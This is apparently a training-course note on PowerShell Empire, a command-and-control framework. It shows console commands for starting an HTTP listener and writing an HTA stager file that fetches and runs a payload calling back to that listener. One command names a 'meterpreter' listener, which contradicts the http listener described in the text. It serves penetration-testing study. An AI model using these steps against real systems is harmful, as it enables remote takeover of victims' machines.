# Module 23 (Powershell Empire)

## Powershell Empire&#x20;

### Listener

```
// Empire commands used
?
uselistener http
info
```

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

Starting the listener:

```bash
execute
```

### Stager

Stager will download and execute the final payload which will call back to the listener we set up previously - `http`- below shows how to set it up:

```bash
//specify what stager to use
usestager windows/hta

//associate stager with the http listener
set Listener meterpreter

//write stager to the file
set OutFile stage.hta

//create the stager
execute
```

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

